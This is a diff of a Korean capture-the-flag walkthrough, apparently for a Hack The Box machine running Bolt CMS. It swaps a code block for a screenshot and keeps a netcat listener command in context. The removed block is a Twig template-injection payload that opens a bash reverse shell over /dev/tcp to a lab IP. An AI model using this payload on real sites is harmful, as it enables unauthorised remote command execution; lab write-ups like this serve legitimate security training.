@@ -347,9 +347,7 @@ $ nc -lvnp 9002
 
 그 후, `index.twig` 템플릿 파일로 돌아가 아래 리버스 셸 페이로드를 삽입하였다:
 
-```twig
-&#123;&#123;["bash -c 'bash -i >& /dev/tcp/10.10.14.171/9002 0>&1'"]|filter('system')&#125;&#125;
-```
+![리버스 셸 삽입](/assets/htb-linux/talkative/bolt-revshell.png)
 
 해당 스크립트를 실행한 결과, 정상적으로 `web-data` 권한으로 웹 서버 내부 셸 접근에 성공하였다.
 
